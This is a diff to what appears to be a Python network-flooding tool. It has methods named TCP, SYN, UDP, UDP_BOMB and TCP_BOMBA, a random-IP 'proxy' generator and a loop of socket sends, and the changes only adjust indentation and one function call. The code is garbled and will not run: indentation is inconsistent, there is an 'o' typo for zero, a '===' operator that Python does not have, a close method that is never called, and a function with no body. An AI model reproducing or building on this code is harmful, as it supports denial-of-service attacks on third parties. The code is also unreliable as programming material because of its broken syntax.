@@ -68,7 +68,7 @@ def TCP():
 
         s.sendto(data, addr)
         
- def TCP_BOMBA():
+    def TCP_BOMBA():
  
   def randproxy():
      ip = ".".join(map(str, (random.randint(o,255)for _ in range(4)))
@@ -95,7 +95,7 @@ def TCP():
               finally:
                 sock.close
      
-def SYN():
+   def SYN():
       
 def randproxy():
     ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
@@ -163,14 +163,14 @@ if __name__ == '__main__':
 	try:
 		if method == 'TCP':
 			TCP()
-	  elif method == 'SYN':
-	    SYN()
+	        elif method == 'SYN':
+	                SYN()
 		elif method == 'UDP':
 			UDP()
 		elif method == 'UDP_BOMB':
 		  UDP_BOMB()
 		elif method === 'TCP-BOMBA':
-		  TCP-BOMBA
+		  TCP_BOMBA()
 		  
 		else:
 			print("Unknow method: %s" % method)
